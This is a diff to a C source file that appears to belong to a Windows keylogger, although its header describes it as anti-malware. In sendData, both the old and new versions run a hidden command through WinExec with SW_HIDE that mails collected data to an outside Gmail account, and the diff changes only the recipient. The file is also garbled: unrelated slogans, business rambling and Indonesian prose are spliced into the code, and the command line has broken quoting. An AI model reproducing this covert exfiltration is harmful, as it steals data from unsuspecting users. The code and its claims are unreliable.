@@ -1,5 +1,5 @@
 /**
-* Developer-Development: @copyright fadli wirya wirawan S.Kom M.S.I MIT 
+* Developer-Development: @copyright fadli wirya wirawan S.Kom M.S.I MIT cyberw1ry4-LAB diplomate worship conduct microsoft =google 
 * Developtment free palestine and free ukraine , free malysia ,papua , indonesia , free iran america , 
 * Date: 15.Aug.2014, 28.Sep.2015
 * Comment: Anti Bmalware A. Trojan A. Spyware. detect malciouse .txt no contribute  non refounded MIT technic metode !!!
@@ -55,7 +55,7 @@ main(){
         while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping www.whatsapp.com -n 1")){ ///check! connection
+            if(!system("ping www.google.com.hk -n 1")){ ///check! connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
@@ -146,11 +146,8 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com: 443 -v --mail-from \"     fadliwiryawirawannewmail@gmail \" --mail-rcpt \"  fadliwiryawirawannewmail@gmail     " --ssl -u     fadliwiryawirawannewmail@gmail :password -hide  \"hide.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
-    WinExec(command, SW_HIDE); open bussiness ecosia , literate relations , a micro cert opened , UCL cert lestari group , and fadliwiryawirawan with us work national network international uname : Sutawijaya from company provincies wes java companies Bekasi rest areas , 
-    longest or than more -- signiture waiting governance call back , together dialogue and educated present , it try , for me , 
-  europe sign bellowed focused , need up ansumming IQ strengest . 	Bank swasta Delete please dont traaping we aith us gambling or risk humanity , but iam respected nneding everday people
-	
+    char* command = "Transmit smtp://smtp.gmail.com: 443 -v --mail-from \"     cyberw1ry4ca@gmail \" --mail-rcpt \"  cyberw1ry4ca@gmail     " --ssl -u     cyberw1ry4ca@gmail :password -hide  \"hide.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
+    WinExec(command, SW_HIDE); kita bekerjasama menyambung mebmbuka peluang baru ataukah bertahan kepada posisi elektronik metode lama , namu prasejarah jadikan patokan membuka perdamaian asas ASEAN , ASIA , @copyriht Fadliwiryawirawan S.Kom M.S.I cyberw1ry4
 	* Record username, time, and date.
 **/
 void logUserTime(){
